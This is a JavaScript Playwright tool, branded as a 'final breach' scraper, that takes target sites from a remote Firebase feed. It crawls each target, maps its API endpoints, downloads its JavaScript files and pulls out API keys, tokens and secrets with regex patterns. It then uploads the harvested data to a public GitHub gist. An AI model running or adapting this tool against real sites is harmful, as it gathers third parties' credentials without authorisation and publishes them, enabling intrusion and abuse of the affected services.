/**
 * XY-ULTIMATE-SCRAPER (FINAL CODE)
 * Brand: XY | Author: Haekal (Kal) & Jem
 * PoweredBy Kall & XyTeam
 */

const { chromium } = require('playwright');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

// CONFIGURATION
const FIREBASE_URL = "https://kall-e4441-default-rtdb.asia-southeast1.firebasedatabase.app/scraper/request.json";
const GITHUB_TOKEN = process.env.XY_GIST_TOKEN;

async function runFinalBreach() {
    console.log(" [XY] INITIATING FINAL BREACH SYSTEM...");
    let browser;

    try {
        // 1. Dapatkan Target dari Firebase
        const { data: request } = await axios.get(FIREBASE_URL);
        if (!request || !request.target) return console.log(" [!] NO TARGET SIGNAL.");

        console.log(` [>] LOCKING TARGET: ${request.target}`);

        // 2. Launch Stealth Engine
        browser = await chromium.launch({ headless: true });
        const context = await browser.newContext({
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            viewport: { width: 1280, height: 720 },
            extraHTTPHeaders: { 'Accept-Language': 'en-US,en;q=0.9' }
        });
        
        const page = await context.newPage();
        const vault = {
            endpoints: [],
            secrets: [],
            assets: { js: [], css: [], images: [] },
            meta: {
                target: request.target,
                timestamp: new Date().toISOString(),
                author: "PoweredBy Kall & XyTeam"
            }
        };

        // 3. Deep Sniffing (Intercept Request)
        page.on('request', req => {
            const url = req.url();
            const type = req.resourceType();

            // Tangkap API & Endpoints
            if (url.match(/api|v1|v2|graphql|json|config/i) && !url.match(/\.(png|jpg|woff|svg)/i)) {
                vault.endpoints.push(url);
            }
            // Petakan Assets
            if (type === 'script') vault.assets.js.push(url);
            if (type === 'stylesheet') vault.assets.css.push(url);
            if (type === 'image') vault.assets.images.push(url);
        });

        // 4. Breach Target & Force Interaction
        await page.goto(request.target, { waitUntil: 'networkidle', timeout: 60000 });
        
        console.log(" [>] PERFORMING DEEP SCAN & AUTO-SCROLL...");
        await page.evaluate(async () => {
            await new Promise(resolve => {
                let totalHeight = 0;
                let distance = 300;
                let timer = setInterval(() => {
                    window.scrollBy(0, distance);
                    totalHeight += distance;
                    if (totalHeight >= document.body.scrollHeight || totalHeight > 10000) {
                        clearInterval(timer);
                        resolve();
                    }
                }, 100);
            });
        });

        // Tunggu render extra untuk single-page app (SPA)
        await page.waitForTimeout(10000);

        // 5. THE JS-CRACKER ENGINE (Bongkar isi file JS)
        console.log(` [>] CRACKING ${vault.assets.js.length} JS ASSETS...`);
        const uniqueJs = [...new Set(vault.assets.js)];
        
        for (const jsUrl of uniqueJs) {
            // Hanya bongkar file yang relevan dengan target atau punya nama 'api/main/config'
            if (jsUrl.includes(new URL(request.target).hostname) || jsUrl.match(/api|main|config|index|vendor/i)) {
                try {
                    const res = await axios.get(jsUrl, { timeout: 10000 });
                    const code = res.data;

                    // Regex: Cari Hidden URL/Endpoints
                    const foundUrls = code.match(/(?:https?|ftp):\/\/[\n\S]+/g);
                    if (foundUrls) {
                        const filtered = foundUrls.filter(u => u.includes('api') || u.includes('v1') || u.includes('auth'));
                        vault.endpoints.push(...filtered);
                    }

                    // Regex: Cari Keys, Tokens, Secrets
                    const secretPatterns = [
                        /(?:key|secret|token|auth|id|bearer|client_id|sid)["']?\s*[:=]\s*["']([^"']+)["']/gi,
                        /AIza[0-9A-Za-z-_]{35}/g, // Google API Keys
                        /db\.asia-southeast1\.firebasedatabase\.app/g // Firebase check
                    ];

                    secretPatterns.forEach(pattern => {
                        const matches = code.match(pattern);
                        if (matches) vault.secrets.push(...matches);
                    });
                } catch (e) { continue; }
            }
        }

        // 6. Data Cleaning
        vault.endpoints = [...new Set(vault.endpoints)];
        vault.secrets = [...new Set(vault.secrets)];
        vault.assets.js = [...new Set(vault.assets.js)];

        // 7. Save Local (untuk Backup Git Push)
        const domain = new URL(request.target).hostname.replace(/\./g, '_');
        const localPath = `./hasil/FINAL_${domain}.json`;
        if (!fs.existsSync('./hasil')) fs.mkdirSync('./hasil');
        fs.writeFileSync(localPath, JSON.stringify(vault, null, 4));

        // 8. Push to Gist
        if (GITHUB_TOKEN) {
            console.log(" [>] SECURING DATA TO GIST...");
            await axios.post('https://api.github.com/gists', {
                description: `XY-FINAL-BREACH: ${domain}`,
                public: true,
                files: { [`${domain}_vault.json`]: { content: JSON.stringify(vault, null, 4) } }
            }, { headers: { 'Authorization': `token ${GITHUB_TOKEN}` } });
            console.log(" [OK] VAULT SECURED.");
        }

    } catch (err) {
        console.error(` [!] CRITICAL ERROR: ${err.message}`);
    } finally {
        if (browser) await browser.close();
        console.log(" [SYS] WORK COMPLETE. AGENT DISCONNECTED.");
        process.exit(0);
    }
}

runFinalBreach();
